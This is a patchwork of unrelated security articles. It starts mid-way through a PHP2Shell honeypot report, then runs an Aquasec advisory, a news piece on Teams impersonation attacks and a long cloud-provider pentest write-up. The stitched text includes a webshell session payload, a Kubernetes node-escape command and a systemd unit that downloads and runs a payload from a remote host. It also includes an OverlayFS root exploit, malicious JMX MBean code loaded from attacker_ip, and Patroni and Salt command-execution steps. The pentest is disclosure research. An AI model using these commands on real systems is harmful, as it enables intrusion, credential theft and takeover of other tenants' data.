We observed no such leak. In all but one run, the connection closed without a response. The remaining run returned a normal 32-character session cookie. None of the sources sent the final exploit stage.

Why the leaks may have failed

The failed leaks highlight a broader challenge: building a generalized exploit that works reliably across PHP versions and deployment configurations is difficult. The kit’s B1 layout was calculated for the official php:8.4.26-apache image with a 128 MB memory limit. Other instances like our Roundcube honeypot ran the same PHP version from a different build, with additional extensions and a 64 MB memory limit. These differences can affect heap layout and memory reuse, potentially preventing the leak from working as expected.

Reliable worker pinning adds another challenge. Consecutive exploit requests must reach the same Apache child process while the required session state persists. Request timeouts, network latency and worker availability can disrupt this sequence. In our own testing, request timeouts combined with network latency were enough to prevent the chain from completing over an internet connection.

So far, we have not identified a publicly available, generalized solution for either worker pinning or information leaking across different deployments. Simply copying public PoCs and running them at scale does not address the work needed to turn a configuration-specific exploit into a reliable operational kit. We expect these barriers to diminish over time: some threat actors have the expertise needed to adapt the chain and build more robust tooling.

Other attempts

We also saw failed exploitation attempts from 15.204.59[.]70 and 162.35.99[.]94, but these scanners did successfully exploit Adel Karimi's honeypot, which was a likely contributing factor to CISA’s decision to include PHP2Shell in their KEV list.

PHP2Shell-branded tools unrelated to the vulnerabilities

We also observed tools labeled as PHP2Shell exploits that did not actually attempt to exploit either vulnerability. The earliest such traffic, from 85.11.187[.]35, matched a Go port of “Chain A” from WoYinDao/CVE-2026-109618-CVSS-9.2-Critical.

The tool used a longstanding session-poisoning technique, attempting to write PHP code into a session file through the upload-progress feature. The request below is abbreviated:

POST /index.php HTTP/1.1 Host: <honeypot> User-Agent: Go-http-client/1.1 Content-Type: multipart/form-data; boundary=----php2shell-golang PHP_SESSION_UPLOAD_PROGRESS = <?php echo "PHP2SHELL_XBu4Je"; system($_GET["c"]); ?> PHPSESSID = <attacker-chosen ID> f (file) = "Z"

It then attempted to execute that code by including the session file:

GET /lfi_sink.php?c=id&f=/tmp/sess_SUjKIKy3Rr6QsaJ1Ik7Rme8h3n HTTP/1.1

Crucially, lfi_sink.php is a vulnerable endpoint supplied by the PoC’s lab environment. The tool assumes that this endpoint exists on the target; without it or an equivalent local file inclusion (LFI) vulnerability, the chain cannot execute code.

A padded variant triggered our memory-exhaustion detection, but we observed no successful code execution. Despite the PHP2Shell branding, this activity relied on an unrelated technique and a vulnerable application endpoint.

Conclusion

We have not yet observed successful end-to-end PHP2Shell exploitation in our own telemetry. However, Adel Karimi’s public report and supporting data provide the most robust public evidence we have seen to date, correlating exploit traffic, memory disclosure and subsequent code execution on his honeypots. Notably, those targets used a favorable single-worker Apache mod_php configuration, so the findings do not establish reliability across other deployments.

Our observations show that triggering memory exhaustion alone is not enough to complete the exploit chain. Differences in PHP builds, memory limits and worker behavior can prevent subsequent stages from working. The challenge for opportunistic attackers is turning currently available public PoCs into similarly reliable operational tooling or developing it on their own. In our view, PHP2Shell remains a risk in both the short and long term and applying the PHP security updates or remediating through other means therefore remains essential.

Full Text:
How is Aquasec addressing HTTP2Shell?

Aquasec has reviewed the impact of HTTP2Shell on its own components and confirmed that the affected Brotli library was present in certain Aquasec Enforcer images.

However, our security analysis determined that the vulnerable decoding functionality is not used by Enforcer components. The Enforcer does not decompress Brotli data, meaning the conditions required to exploit HTTP2Shell through the affected decoder are not present in the assessed Enforcer execution paths.

Our assessment included examination of both source code and released binaries to verify that the vulnerable decoder is not invoked during Enforcer operation.

Although the vulnerable library was not reachable through Enforcer functionality, we have released an updated Enforcer versions for both Update 47 and Update 45 LTS containing the corrected Brotli package.

Aquasec Enforcer 2022.4 U47 SP2 (2022.4.951.5) and 2022.4 U45 Enforcer LTS SP9 (2022.4.880.50) are now available. We recommend that customers upgrade to this release to remove the vulnerable dependency and address associated scanner findings.

Customers looking for additional information about affected versions, our technical assessment and upgrade guidance can refer to the Aquasec Support Knowledge Base and the U47 SP2 release documentation or the U45 Enforcer LTS SP9 release documentation

Title: Attackers Exploit Teams External Chat to Breach Organizations in Under 15 Minutes
Context: Attackers Hide Malware Behind Signed ChatGPT and Claude Binaries Attackers Exploit Teams External Chat to Breach Organizations in Under 15 Minutes Online Scam Volumes Double to...
Full Text:
Threat actors are abusing Microsoft Teams’ external chat creation feature to target employees for initial access into organizations, new research by Arctic Wolf has found.

The researchers said they had observed over 400 incidents in which the function was abused, with “highly consistent” IT-support impersonation tactics deployed by the malicious actors.

The attack chain is rapid, with payload execution reached in under 15 minutes from when a victim engages with the initial social engineering message.

The attackers often target multiple victims within short windows of time, which suggests the use of automation.

“Across the activity examined, attackers combined email bombing, convincing IT-support impersonation, newly created tenants and domains, and rapid social engineering to move victims from a seemingly routine chat to remote access, payload execution, and, in some cases, broader compromise,” the Arctic Wolf researchers wrote in the report published on October 26, 2026.

The researchers did not identify the perpetrators behind these attacks. However, it noted that the use of the external Teams chat as an initial access vector has been a tactic deployed by ransomware groups including Black Basta.

Threat Actors Establish Legitimate-Looking Teams Identities

Arctic Wolf noted that the external Microsoft Teams chat function has become an effective platform to launch social engineering, with attackers able to make themselves appear legitimate to users.

Teams’ external access is turned on by default, meaning any Teams user in another Microsoft 365 tenant can find, chat with, and call an organization’s employees, provided both tenants allow external access.

In the observed incidents, the threat actors established external Teams identities through newly created or acquired Microsoft 365 tenants. Between 30-40% of the cases involved default onmicrosoft[.]com tenant domains, which do not require verification and can be provisioned within minutes.

The attackers typically selected a support-, IT-, admin-, network-, or helpdesk-themed word as the tenant name, optionally suffixed with the number 365, to appear as an IT-support worker.

In addition, threat actors used fake first names, such as “IT Service Desk – Liam”, to make it appear as though the message came from a real member of the organization’s service desk.

In a small number of cases, legitimate company names were included in the sender’s tenant name to increase their credibility.

In a “significant number” of the attacks the target’s email was flooded with hundreds of newsletter or subscription confirmations within minutes, a tactic known as mail bombing.

The attackers then sent a Teams “IT support” message moments later to offer to resolve the very same problem the attacker just created.

Following the initial contact, the attackers’ next aim in most cases was to obtain hands-on-keyboard access through legitimate remote monitoring and management (RMM) tools, most frequently Quick Assist, which is built into Windows and therefore requires no installation.

When attackers seek persistence beyond the initial call, they pivot to a commercial RMM tool, such as AnyDesk and ScreenConnect.

These RMM tools can enable to attackers to execute a PowerShell payload and undertake lateral movement across the organizations network for purposes such as ransomware.

In some cases, the user was instructed to run the PowerShell command and launch the downloaded file.

Title: An insecure neighbor: how a vulnerability chain led to an isolation bypass in cloud infrastructure
Context: To exploit the vulnerability, a copy of the python3 interpreter was created with the setuid capability set, which made it possible to gain root privileges
Full Text:
This article is published for educational purposes only, to raise awareness among information security professionals. The research was part of an official bug bounty program on a major platform. We notified the cloud provider about the vulnerabilities in line with our responsible disclosure policy, and all security issues we found were fixed in full. The infrastructure analyzed in this post has been anonymized, so the organization cannot be identified. We believe that regular pentests, bug bounty programs, and conversations between developers and independent researchers are the foundation of security for any IT product.

Introduction

Many experts believe that cloud data breaches are mostly the customers’ fault, caused by issues like misconfigured storage or open ports. However, our penetration test of a major cloud provider demonstrated that critical threats can originate within the provider’s own infrastructure.

This analysis is based on a real-world case that won second place in the System Hacking (Web & Logic) category at Russian Pentest Award 2026. It covers the sequential exploitation of several vulnerabilities and logic errors. Together, they led to critical business consequences and a complete bypass of tenant isolation within the cloud. On October 22, 2026, I presented a technical analysis of this case in my “Smash the Tenant Boundary” talk at Security Analyst Summit (SAS 2026).

1. Gaining initial access through a managed Kubernetes cluster

Our cloud infrastructure pentest followed the threat model of an external attacker with the privileges of a regular tenant. The ultimate goal of the attack was to assume full control of the cloud.

1.1. Escaping the worker node

First, we created a resource in the cloud’s managed Kubernetes cluster (v1.25.16+k0s.0). As a rule, the provider deliberately withholds SSH access to worker nodes from tenants, because they’re paying for a managed service, not for running servers themselves. In this case, however, the cluster’s security policies did not prevent the creation of privileged pods with access to host namespaces. This enabled us to deploy a pod and switch the execution context to the host machine running the container.

kubectl run pod-name-bla \ --image=alpine \ --restart=Never \ --overrides=' { "apiVersion": "v1", "spec": { "hostPID": true, "containers": [ { "name": "priv", "image": "alpine", "command": [ "sh", "-c", "sleep 3600" ], "stdin": true, "tty": true, "securityContext": { "privileged": true } } ] } }'

After creating the privileged pod, we ran the nsenter command inside the container. It moved the execution context to the host machine:

nsenter --target 1 --mount --uts --ipc --net --pid – bash

After this, the bash shell ran on the actual host machine, not inside the container. Because the pod was privileged, we got full root access to the host machine.

Kubelet configuration and API server address

Next, we analyzed its file system. While researching the data plane, we found a Konnectivity service token. This component provides a tunnel between the control plane and the data plane of a Kubernetes cluster. It was this component that opened up interesting opportunities for developing the attack.

Konnectivity service account token

1.2. Analysis of control plane services

After gaining access to the host machine (the worker node mentioned earlier), we analyzed its network interfaces: the user VPC and the Calico interfaces. We extracted the kube-apiserver address (192.168.0.4) from the kubelet configuration file. A subsequent scan of this address revealed the following open ports:

192.168.0.4:9443 open https status=404 192.168.0.4:2380 open 192.168.0.4:6443 open http status=400 192.168.0.4:8132 open 192.168.0.4:9100 open http status=200 title="Node Exporter" 192.168.0.4:9308 open http status=200 title="kube-state-metrics"

Of greatest interest is port 8132, where Konnectivity runs. This service creates a reverse tunnel between the control plane and the data plane so that the data plane is visible from the control plane. This allows management components to communicate with worker nodes, even behind a NAT. The Konnectivity token found earlier granted permission to interact with this service.

Interaction diagram between control plane and data plane via Konnectivity

1.3. Exploiting Konnectivity

To analyze the service on port 8132, we deployed a local test environment. We found that v1.25.16+k0s.0 uses a fork of konnectivty-server, inherited from apiserver-network-proxy in the original Kubernetes.

A quick primer on k0s: this is a minimalist Kubernetes distribution designed for cloud providers. It’s a convenient base for deploying managed clusters (mk8s) with minimal resource overhead. An important feature of k0s is that running user pods on control plane nodes (also known as master nodes) is disabled by default. This meets mk8s security requirements for control plane isolation.

Port 8132, mentioned above, hosts AgentService, which provides a single method: Connect. This method accepts a Packet stream.

service AgentService { rpc Connect(stream Packet) returns (stream Packet) {} }

The code revealed an interesting detail: when AgentService receives a packet of the type DIAL_REQ from a worker node, the server calls the net.Dial() function on the control plane side. The packet structure for the Connect method looks like this:

//apiserver-network-proxy/konnectivity-client/proto/client/client.proto:26

enum PacketType { DIAL_REQ = 0; DIAL_RSP = 1; ... } message Packet { PacketType type = 1; oneof payload { DialRequest dialRequest = 2; DialResponse dialResponse = 3; Data data = 4; CloseRequest closeRequest = 5; CloseResponse closeResponse = 6; CloseDial closeDial = 7; } } message DialRequest { // tcp or udp? string protocol = 1; // node:port string address = 2; // random id for client, maybe should be longer int64 random = 3; }

The server reads any Packet packets from the stream initiated by the agent (worker node):

//apiserver-network-proxy/pkg/server/server.go:721 in, err := stream.Recv() ... recvCh <- in

Next, the packets go to the backend manager:

//apiserver-network-proxy/pkg/server/server.go:748 func (s *ProxyServer) serveRecvBackend(...) { for pkt := range recvCh { switch pkt.Type {

Then comes the most interesting part:

//apiserver-network-proxy/pkg/server/server.go:888 case client.PacketType_DIAL_REQ: req := pkt.GetDialRequest() klog.V(5).InfoS("Received DIAL_REQ", "target", req.Address) s.handleDialRequest(pkt, backend)

In other words, a DIAL_REQ that comes from the agent (worker node) was considered valid and passed to the packet handler for the corresponding type (DIAL_REQ).

//apiserver-network-proxy/pkg/server/server.go:921 func (s *ProxyServer) handleDialRequest(pkt *client.Packet, backend Backend) { ... dialReq := pkt.GetDialRequest() resp.GetDialResponse().Random = dialReq.Random start := time.Now() conn, err := net.Dial(dialReq.Protocol, dialReq.Address) // we control proto and address

This created an SSRF primitive in the control plane context, which made it possible to reach not only network resources but also host UNIX sockets. D-Bus (- /run/dbus/system_bus_socket) was chosen as a promising target for interaction. The busctl utility revealed the following services available on the control plane:

org.freedesktop.DBus org.freedesktop.PackageKit org.freedesktop.PolicyKit1 org.freedesktop.login1 org.freedesktop.systemd1 com.ubuntu.SoftwareProperties

Using the org.freedesktop.DBus.GetConnectionCredentials method with a custom D-Bus client we wrote on top of github.com/godbus/dbus/v5, we were able to retrieve the UID of the current process. In this case, it was 997. Unfortunately, it wasn’t root, which means we couldn’t instantly start a system service in systemd. However, it was still possible to create a user service (system –user). To do this, we first enabled lingering for our UID:

busctl --address=unix:path=/tmp/master-dbus.sock \ call org.freedesktop.login1 \ /org/freedesktop/login1 \ org.freedesktop.login1.Manager \ SetUserLinger ubb 997 true false

The following sockets were then opened:

/run/user/997/bus /run/user/997/systemd/private (this socket is the equivalent of running commands through systemctl --user.)

Through this new socket, we called the StartTransientUnit method of the org.freedesktop.systemd1.Manager service:

StartTransientUnit( name: string, mode: string, properties: a(sv), aux: a(sa(sv)) ) -> job object path

The properties parameter is exactly where you pass the standard systemd service definition directives. We added the following line:

ExecStart=/bin/sh -c "bash -lc 'curl ip:port/payload -o /tmp/love;chmod +x /tmp/love; setsid /tmp/love '"

As a result, we successfully received a callback from the control plane.

Konnectivity-server context and node network interfaces

Mirantis, the company behind the k0s project, confirmed the vulnerability.

1.4. Privilege escalation on the host

Since konnectivity-server runs with limited privileges by default, the next step after achieving RCE on the control plane was to escalate those privileges. An analysis of processes on the control plane node revealed a running salt-minion service. Root privileges allow authentication in salt-minion as that minion and further attacks against it (more on that later).

In our case, the target host ran Ubuntu 22.04 with kernel version 5.15.x. Because user namespaces were enabled, a known bug in OverlayFS offered a viable path to privilege escalation: it allows a file to retain the cap_setuid+eip capabilities after namespace manipulation.

To exploit the vulnerability, a copy of the python3 interpreter was created with the setuid capability set, which made it possible to gain root privileges.

rm -rf /tmp/lpe mkdir /tmp/lpe cd /tmp/lpe unshare -rm sh -c ' mkdir l u w m && cp /usr/bin/python3 l/ && chmod 755 l/python3 && setcap cap_setuid+eip l/python3 && mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/* ' getcap /tmp/lpe/u/python3 /tmp/lpe/u/python3 -c 'import os; os.setuid(0); os.system("id; /bin/sh")'

Confirmation of command execution with root privileges

Gaining root privileges opened up several interesting attack vectors:

We discovered an eth2 interface on the 100.64.0.0/10 subnet on the host. The cloud’s overlay network turned out to be flat, providing visibility into all managed services.

The system stored a salt-minion key pair. This significantly expands the attack surface by providing access to the managed cloud’s own control plane through SaltStack.

2. Adventures in the overlay network

2.1. Victoria stack

An examination of network activity within the managed resource immediately yielded interesting results. Traffic analysis revealed requests from a specific IP address to collect node metrics from our kube-state-metrics instance in mk8s. The IP address turned out to belong to a metrics collector, one of the VictoriaMetrics instances serving numerous managed resources. Like Prometheus, the VictoriaMetrics API exposes a list of targets from which it collects metrics.

When we queried the http://100.64.13.37:8429/api/v1/targets endpoint, we found that each target’s labels contained valuable metadata:

"discoveredLabels": { "__address__": "http://100.64.1.1:6897/metrics", "__meta_url": "CENSORED", "__metrics_path__": "/metrics", "__scheme__": "http", "__scrape_interval__": "2m0s", "__scrape_timeout__": "2m0s", "cluster_id": "676767", "customer": "customerID", "job": "http", "profile": "kubernetes", "vds_id": "1337", "version": "1.0" }

It’s worth noting that a single VictoriaMetrics query returns a full list of control plane hosts that belong to other cloud tenants. Port 6897 indicates that the kube-state-metrics exporter is running, and the profile: kubernetes field further confirms the target type at this address.

We found another host from the Victoria ecosystem on the same network: VictoriaLogs. The service’s web interface on port 9428 also exposes API endpoints that can reveal sensitive data. For example, the /select/logsql/query endpoint allowed unauthorized access to all logs from any managed resource in the cloud. Analysis of the control plane logs for mk8s revealed a critical detail: the cloud-init scripts generated private SSH keys for the root account by default. These keys were printed to stdout and automatically saved in the shared system logs.

Correlating certain label values from VictoriaMetrics helped us reconstruct the target host’s original names. This makes it easier to filter data in VictoriaLogs and unambiguously match a compromised private key to the target node where it can be used.

Private SSH key in a VictoriaLogs record

We could use the compromised private key for a privileged account to connect to the target nodes over SSH and gain full control of other tenants’ clusters.

Process privileges on the host and available actions in Kubernetes

Logs from other types of services could likely reveal additional sensitive data that would further increase the impact.

2.2. Compromising managed Kafka instances

We explored the option to deploy managed Apache Kafka resources. As expected, we also found these instances on the flat overlay network. One Kafka host had port 9999 open, which turned out to be a JMX Registry.

Discovered Java RMI service on port 9999

The JMX Registry mechanism is inherently vulnerable: it returns an RMI stub-host to the calling client, which allows remotely loading an arbitrary custom MBean class and executing arbitrary code. We ran an nmap -sC scan against the registry port to identify the exact port of the RMI service we would interact with next. To carry out the attack, we prepared a set of Java scripts with the following structure:

JmxCreateMBean.java: connects to the JMX Registry and creates an MBean component, javax.management.loading.MLet (a class that loads classes from a specified URL).

JmxInvoke.java: invokes the selected MBean method through the JMX Registry.

ExecMBean.java and Exec.java a custom lightweight test MBean component with a run(String cmd) method that provides an interface for remote command execution.

The code that handles the connection and initialization of the MBean component looks like this:

//JmxCreateMBean.java ... import javax.management.remote.JMXConnector; import javax.management.remote.JMXConnectorFactory; import javax.management.remote.JMXServiceURL; public class JmxCreateMBean { private static final class RewritingSocketFactory extends RMISocketFactory { private final String fromHost; private final String toHost; RewritingSocketFactory(String fromHost, String toHost) { ... } @Override public Socket createSocket(String host, int port) throws IOException { ... } @Override public ServerSocket createServerSocket(int port) throws IOException { ... } } public static void main(String[] args) throws Exception { ... RMISocketFactory.setSocketFactory(new RewritingSocketFactory(args[2], args[3])); String url = String.format("service:jmx:rmi:///jndi/rmi://%s:%s/jmxrmi", args[0], args[1]); try (JMXConnector connector = JMXConnectorFactory.connect(new JMXServiceURL(url), new HashMap<>())) { var mbsc = connector.getMBeanServerConnection(); try { ObjectInstance created = mbsc.createMBean(args[4], new ObjectName(args[5])); System.out.println("CREATED " + created.getObjectName() + " " + created.getClassName()); } catch (InstanceAlreadyExistsException e) { System.out.println("EXISTS " + args[5]); } } } }

Below is the implementation of the malicious Exec.java class, which provides methods to execute shell commands and read and write files with Base64 encoding:

// Exec.java import java.nio.charset.StandardCharsets; import java.nio.file.Files; import java.nio.file.Path; import java.util.Base64; public class Exec implements ExecMBean { @Override public String run(String cmd) throws Exception { Process p = new ProcessBuilder("/bin/sh", "-c", cmd).redirectErrorStream(true).start(); byte[] out = p.getInputStream().readAllBytes(); int rc = p.waitFor(); return "rc=" + rc + "\n" + new String(out, StandardCharsets.UTF_8); } @Override public String getB64(String path) throws Exception { return Base64.getEncoder().encodeToString(Files.readAllBytes(Path.of(path))); } @Override public String putB64(String path, String b64) throws Exception { byte[] data = Base64.getDecoder().decode(b64); Files.write(Path.of(path), data); return "wrote " + data.length + " bytes"; } }

After compiling our custom MBean, we place the resulting JAR file on a remote web server and prepare an mlet.html configuration file so the target server can load it.

<html> <mlet code="Exec" archive="execmbean.jar" name="payload:type=Exec"></mlet> </html>

We then perform the following steps:

Create a standard MLet loader inside the Kafka JVM.

Load the malicious MBean onto the target server by calling the getMBeansFromURL method of the standard MLet component (DefaultDomain:type=MLet). The URL of the prepared file is passed as an argument: http://attacker_ip:8000/mlet.html.

Call the run(String cmd) method of the loaded MBean to achieve RCE on the host.

Kafka process context and node network interfaces

This attack vector was possible because the RMI stub host, which security standards require to be bound only to the loopback interface (127.0.0.1), was mistakenly exposed to the cloud’s shared overlay network.

2.3. Credential leakage through redis-exporter

The next step was to analyze hosts running managed Redis instances. Alongside the main port 6379 used by Redis, each host had a redis exporter service on port 9121. Analysis of its source code revealed a logic vulnerability in how the target parameter was handled:

//redis_exporter/exporter/http.go:47 func (e *Exporter) scrapeHandler(w http.ResponseWriter, r *http.Request) { target := r.URL.Query().Get("target") ... if !strings.Contains(target, "://") { target = "redis://" + target } u, err := url.Parse(target) ... opts := e.options ... _, err = NewRedisExporter(target, opts) ...

Essentially, the /scrape handler accepts an arbitrary target parameter and attempts to collect metrics from that target with the same credentials the exporter uses to connect to its primary Redis instance. Directing a redis exporter request to an attacker-controlled host, such as one running nc -nvlp 6379, makes it possible to intercept the following credentials:

http://<redis_expoter_host>:9121/scrape?target=<fake_redis_server>

AUTH command in an intercepted Redis request

The captured credentials allowed access to other customers’ Redis instances to read, modify, or delete stored data.

Diagnostic information of the Valkey instance

(Note. A Redis RCE vulnerability was disclosed during the research. Combined with the access obtained, it made it possible to fully compromise other tenants’ services).

2.4. Compromise of managed PostgreSQL (Patroni) clusters

The PostgreSQL DBMS is one of the most popular managed resources alongside mk8s. The next step was therefore to analyze PostgreSQL hosts in the overlay network. Scanning nodes with the PostgreSQL port (5432) open revealed related services on ports 2379 (an etcd distributed store) and 8008 (Patroni REST API). While the Patroni REST API required authentication, access to etcd was completely unrestricted. Analysis of the contents of etcd revealed a critical key, /v2/keys/service/pg-cluster/config, which contained the Patroni configuration.

Patroni configuration in etcd

{ "ttl": 30, "loop_wait": 10, "retry_timeout": 10, "maximum_lag_on_failover": 1048576, "postgresql": { "use_pg_rewind": true, "parameters": { "archive_command": "id", "archive_mode": "always", "max_connections": 550, "max_locks_per_transaction": 512, "max_worker_processes": 27 } } }

Write access to this configuration file allows an attacker to set archive_command to a command of their choice and achieve RCE on the target host when the archiving process starts. To avoid waiting for the WAL to fill up through normal activity, a way was found to force archiving even with minimal access privileges:

Update the Patroni configuration with the modified archive_command:

curl -s -X PUT http://localhost:2379/v2/keys/service/<CLUSTER_NAME>/config -d value="$(jq -c . config.json)" | jq

Update the configuration again to add the standby_cluster parameter:

{ "ttl": 30, "loop_wait": 10, "retry_timeout": 10, "maximum_lag_on_failover": 1048576, "postgresql": { "use_pg_rewind": true, "parameters": { "archive_command": "rce", "archive_mode": "on", "archive_timeout": "10", "max_connections": 550, "max_locks_per_transaction": 512, "max_worker_processes": 27 } }, "standby_cluster": { "host": "192.0.2.1", "port": 5432 } }

After this parameter is applied, Patroni detects a role conflict for the current primary. The logs show a sequence similar to the following:

cannot be a real primary in standby cluster Demoting self (demote-cluster) received fast shutdown request checkpoint starting: shutdown immediate

Postgres then restarts, and the archiving process runs and executes the injected command:

PostgreSQL process context and node network interfaces

This makes it possible to log in to other tenants’ Postgres DBMS instances and gain full control over the data. As an additional risk factor, files containing credentials for access to S3 storage were found on these hosts.

Database and S3 access parameters in a backup file

This storage holds backups not only of the current instance but also of all other databases in the cloud.

List of backup storage locations in S3

3. Attack on SaltStack management infrastructure

After gaining root access to the control plane node, the focus shifted to the SaltStack configuration management service.

3.1. Analysis of salt fs

The first step was to dump the entire Salt master file system for subsequent static analysis:

Fragment of the Salt Master file list

It contained numerous files.

salt-call --out=newline_values_only cp.list_master saltenv=redacted | sed '/^$/d' | while read -r f; do mkdir -p "/tmp/dump/$(dirname "$f")" salt-call --out=newline_values_only cp.get_file "salt://$f" "/tmp/dump/$f" saltenv=redacted >/dev/null done

Because the Salt version in use was up to date, no known CVEs were applicable. However, we found a custom script (_pillar/somebase.py) with a critical vulnerability among the files on the Salt master. The vendor had written it to service minions running the somebase service. The vulnerability is an insecure SQL query construction through the query.format() method:

sql = query.format( minion_id=minion_id, pillar={**pillar, **results}, grains=__grains__, ) loaded_items = db_connections[db_alias].load_object_list(sql)

A Salt minion can trigger a pillar refresh and pass arbitrary metadata (grains) to the Salt master. This allows an attacker to inject SQL code through the some_id parameter inside grains. When the extension on the Salt master side processes the request, the generated SQL query is executed in the prod-cloud database. As a result, the vulnerability makes an error-based SQL injection possible.

Database error during pillar processing

3.2. Exploiting the SQLi

This vulnerability provided access to various database schemas. The most interesting one was the cloudsmth schema, which contained about 50 tables with metadata of all managed resources and VDS.

Fragment of the table list in the cloudsmth schema

Even more notable was the salt-masters table, which held authentication tokens for all Salt masters.

Records with Salt Master authentication tokens

With these tokens, we could access the Salt master REST API and run arbitrary commands on all minions in the cloud:

curl -k https://salt-master:8000 -H "Accept: application/json" -H "Content-Type: application/json" -H "X-Auth-Token: REDACTED" -d '[{"client":"local","tgt":"hostname-minion","fun":"cmd.run","arg":["id; hostname"]}]'

By agreement with the vendor, the attack was not developed further. Even so, access to the salt-masters table and the prod-cloud database would have made it possible to take over all resources, including VDS, S3, and other services, in a single step.

4. Other ways to attack the cloud

It’s worth mentioning other ways to get into the overlay network, since some of them also produced interesting cases.

4.1. Exploiting a vulnerability in Managed Valkey

During analysis of the Valkey instances deployed in the cloud infrastructure, we found that the software version in use was vulnerable to CVE-2026-25243. At the time of the analysis, no public proofs of concept (PoCs) or exploits existed. To study how the vulnerability manifests, we analyzed the diagnostic data returned by the INFO command:

valkey_version=7.2.11 redis_version=7.2.4 redis_git_sha1=97b6663c redis_git_dirty=0 redis_build_id=a75ca2f023d97d88 gcc_version=13.3.0 arch_bits=64 os=Linux 6.8.0-124-generic x86_64 executable=/usr/bin/valkey-server

The redis_build_id identifier made it possible to determine the exact binary in use. It matched the official build for Ubuntu Noble x86_64.

CVE-2026-25243 is caused by the RESTORE command handling serialized RDB objects incorrectly. When the legacy hash-zipmap encoding is used, the validator accepts a 5-byte length representation for a short key, but the parser that follows interprets the key’s internal bytes as the encoding of the value length. This mismatch can cause an out-of-bounds write that overwrites adjacent heap chunks (heap overflow), which can potentially lead to an arbitrary write primitive. After the successful arbitrary write to adjacent memory regions, strict systemd sandbox rules presented an obstacle:

NoExecPaths=/ ExecPaths=/usr/bin/valkey-server /usr/lib /lib CapabilityBoundingSet= NoNewPrivileges=true PrivateUsers=true ProtectSystem=strict ProtectHome=true SystemCallFilter=@system-service SystemCallFilter=~ @privileged @resources

These parameters block the execution of standard shells, such as /bin/sh. Even so, the /tmp directory was mounted with write access. By modifying the process logic, we could trigger the download and execution of a third-party component from /tmp, which wasn’t covered by the noexec rule. After establishing a stable communication channel, we added an SSH key to /var/lib/valkey/.ssh/authorized_keys. This gave us independent access to the host and the ability to escalate privileges further through standard local privilege escalation (LPE) methods.

Valkey process context and Salt grains parameters

The GRO Frag vulnerability was triggered in this case, but new LPEs are disclosed every week, so there may be many other ways to escalate privileges and continue the attack on the Salt master.
